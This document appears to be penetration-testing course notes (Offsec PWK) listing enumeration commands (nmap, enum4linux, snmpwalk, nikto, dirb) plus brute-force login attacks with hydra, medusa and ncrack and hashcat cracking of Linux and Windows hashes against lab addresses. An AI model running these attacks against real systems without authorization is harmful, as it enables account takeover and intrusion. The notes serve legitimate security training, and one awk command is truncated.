# Offsec

Offsec PWK notes and frecuently used files.

<ol>
  <li><a href="#Scanning">Scanning and Enumeration</a></li>
  <li>Exploitation</li>
  <li>Exploit Development</li>
  <li>Password Attacks</li>
  <li>Reverse Shells</li>
  <li>Privilege Escalation</li>
  <li>File Transfers</li>
  <li>Post Exploitation</li>
  <li>Port Forwarding</li>
  <li>Web Attacks</li>
</ol>


<div id="Scanning"> <h3>2.Scanning and Enumeration</h3></div>

#Define Target IP as TGT

TGT=x.x.x.x 

<h4> NMAP</h4>

nmap++ $TGT

<h4> SMB</h4>

nbtscan -r 10.0.11.1

enum4linux -USGPoi $TGT >> SMB.txt

smbclient -L $TGT

showmount -e $TGT

<h4> SMTP </h4>

nmap -p 25 --script smtp-enum-users.nse,smtp-commands.nse $TGT

<h4> SNMP</h4>

snmpcheck -t $TGT >> ENUM-SNMP.txt

snmpwalk -c public $TGT  -v 2c

onesixtyone -c public.txt -o snmp-onesixtyone.txt -dd $TGT 

<h4> HTTP</h4>

nikto -o nikto.html -Display V -nolookup -host $TGT  && firefox nikto.html

Dirbuster: Change to 50 req/s, no recursion, export simple list. 

dirb http://$TGT /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -l -o dirb.txt

<h4> SSH </h4>

msf > use auxiliary/scanner/ssh/ssh_enumusers

<h3> 4. Dictionary Attacks </h3> 
<p>
ncrack -vv --user rax -P wordlist.txt rdp://10.11.0.10

medusa -h 10.11.0.10 -u root -P /usr/share/wordlists/rockyou.txt -e ns -M ssh

hydra -l administrator -P wordlist.txt 192.168.11.201 ssh

hydra 10.10.10.10 :80 http-form-post "/PHP/index.php:nickname=^USER^&password=^PASS^:bad password" -l garry -P /usr/share/wordlists/nmap.lst -t 10 -w 30 -o hydra-http-post-attack.txt
</p>

<h4> Password Generation with cewl and John </h4>

cewl http://10.11.1.1/index.html >> words.txt

john --wordlist=words.txt --rules --stdout >> wordlist.txt

<h4> Cracking Hashes - Linux </h4>

cat shadow.txt | awk -F':' '{print }' > hashes.txt

hashcat -m 500 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

hashcat -m 1800 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

<h4> Cracking Hashes - Windows </h4>

hashcat -m 1000 -a 0 -o output.txt --remove hashes.txt /usr/share/wordlists/rockyou.txt

